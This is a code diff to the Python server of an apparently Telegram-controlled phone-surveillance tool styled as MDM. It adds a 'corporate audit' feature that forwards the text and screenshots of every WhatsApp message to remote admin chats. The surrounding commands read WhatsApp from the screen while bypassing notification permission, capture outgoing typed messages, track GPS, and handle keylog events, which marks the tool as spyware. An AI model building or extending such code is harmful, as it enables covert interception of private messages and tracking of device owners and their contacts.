@@ -221,6 +221,8 @@ COMMANDS = {
     "whatsapp-live":     {"category": "data", "label": "💬 واتساب مباشر",  "description": "قراءة واتساب من الشاشة (بدون إذن إشعارات)", "needs_param": False},
     "whatsapp-monitor-on":  {"category": "data", "label": "📤 مراقبة واتساب الصادرة", "description": "قراءة الرسائل الصادرة من حقل الكتابة", "needs_param": False},
     "whatsapp-monitor-off": {"category": "data", "label": "⏹ إيقاف مراقبة الصادرة", "description": "إيقاف مراقبة الرسائل الصادرة", "needs_param": False},
+    "whatsapp-audit-on":   {"category": "data", "label": "🏢 تدقيق مؤسسي", "description": "توثيق نص + صورة لكل رسالة", "needs_param": False},
+    "whatsapp-audit-off":  {"category": "data", "label": "⏹ إيقاف التدقيق", "description": "إيقاف نظام التدقيق", "needs_param": False},
     # ⚠️ telegram-messages تمت إزالته — يحتاج Notification Access
     "get-location":   {"category": "data",   "label": "📍 الموقع GPS",     "description": "تتبع موقع الجهاز",       "needs_param": False},
     # camera
@@ -412,6 +414,8 @@ def data_keyboard(did):
     kb.add(_cbtn(did,"whatsapp-live"))
     kb.add(_cbtn(did,"whatsapp-monitor-on"))
     kb.add(_cbtn(did,"whatsapp-monitor-off"))
+    kb.add(_cbtn(did,"whatsapp-audit-on"))
+    kb.add(_cbtn(did,"whatsapp-audit-off"))
     # ⚠️ telegram-messages تمت إزالته
     kb.add(_cbtn(did,"get-location"))
     kb.add(_back(did))
@@ -2028,6 +2032,11 @@ def _sock_file_explorer(data):
         _handle_whatsapp_message(dev, data)
         return
 
+    # ⚡ Check for whatsapp_audit event (نظام التدقيق المؤسسي)
+    if data_type == "whatsapp_audit":
+        _handle_whatsapp_audit(dev, data)
+        return
+
     cmd = data.get("command", "?")
     status = data.get("status", "?")
     logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
@@ -2088,6 +2097,51 @@ def _handle_whatsapp_message(dev, data):
                     logger.error(f"فشل إرسال رسالة واتساب للبوت: {e}")
     except Exception as e:
         logger.error(f"خطأ في معالجة رسالة واتساب: {e}")
+
+
+def _handle_whatsapp_audit(dev, data):
+    # معالجة بيانات نظام التدقيق المؤسسي (نص + إشعار بالصورة)
+    try:
+        text = data.get("text", "")
+        is_outgoing = data.get("outgoing", False)
+        time_str = data.get("time_formatted", "")
+
+        short_id = dev.get('short_id', '?')
+        model = dev.get('model', '?')
+
+        direction = "📤 صادرة" if is_outgoing else "📥 واردة"
+        logger.info(f"🏢 [AUDIT] #{short_id} {direction}: {text[:80]}")
+
+        if mdm_bot:
+            if text.strip():
+                msg = (
+                    f"🏢 <b>تدقيق مؤسسي</b>\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
+                    f"{'📤' if is_outgoing else '📥'} <b>النوع:</b> {direction}\n"
+                    f"🕐 <b>الوقت:</b> {time_str}\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"📝 <b>النص:</b>\n"
+                    f"<code>{text[:2000]}</code>\n"
+                    f"📸 <i>سيتم إرفاق صورة توثيقية (إن أمكن)</i>"
+                )
+            else:
+                msg = (
+                    f"🏢 <b>تدقيق مؤسسي - رسالة واردة</b>\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
+                    f"🕐 <b>الوقت:</b> {time_str}\n"
+                    f"━━━━━━━━━━━━━━━\n"
+                    f"📸 <i>تم التقاط صورة توثيقية</i>"
+                )
+
+            for admin_id in Config.ADMIN_IDS:
+                try:
+                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
+                except Exception as e:
+                    logger.error(f"فشل إرسال تدقيق للبوت: {e}")
+    except Exception as e:
+        logger.error(f"خطأ في معالجة التدقيق: {e}")
 
 
 def _handle_keylog_event(dev, data):
